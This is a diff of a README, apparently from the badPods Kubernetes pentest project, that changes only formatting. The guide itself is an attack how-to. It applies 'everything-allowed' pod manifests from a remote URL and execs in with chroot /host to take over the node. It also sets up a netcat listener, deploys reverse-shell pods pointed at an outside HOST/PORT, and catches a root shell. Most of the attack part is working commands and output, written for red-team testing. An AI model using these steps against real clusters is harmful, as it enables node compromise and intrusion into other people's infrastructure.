@@ -15,7 +15,9 @@
 
 # Pod creation & access
 
-## Exec pods: Create one or more of these resource types and exec into the pod
+## Exec pods
+Create one or more of these resource types and exec into the pod
+
 **Pod**  
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
@@ -65,19 +67,21 @@ kubectl get pods | grep everything-allowed-exec-daemonset
 kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
 ```
 
-## Reverse shell pods: Create one or more of these resources and catch reverse shell
+## Reverse shell pods
+Create one or more of these resources and catch reverse shell
 
-Set up listener
+
+**Set up listener**
 ```bash
 nc -nvlp 3116
 ```
 
-Create pod from local manifest without modifying it by using env variables and envsubst
+**Create pod from local manifest without modifying it by using env variables and envsubst**
 ```bash
 HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
 ```
 
-Catch the shell and chroot to /host 
+**Catch the shell and chroot to /host **
 ```bash
 $ nc -nvlp 3116
 Listening on 0.0.0.0 3116
@@ -85,8 +89,8 @@ Connection received on 10.0.0.162 42035
 # chroot /host
 ```
 
-Generic resource type creation example (replace [RESOURCE_TYPE] with deployment, statefulset, job, etc.): 
-```
+**Generic resource type creation example***
+Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 ```bash
 HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
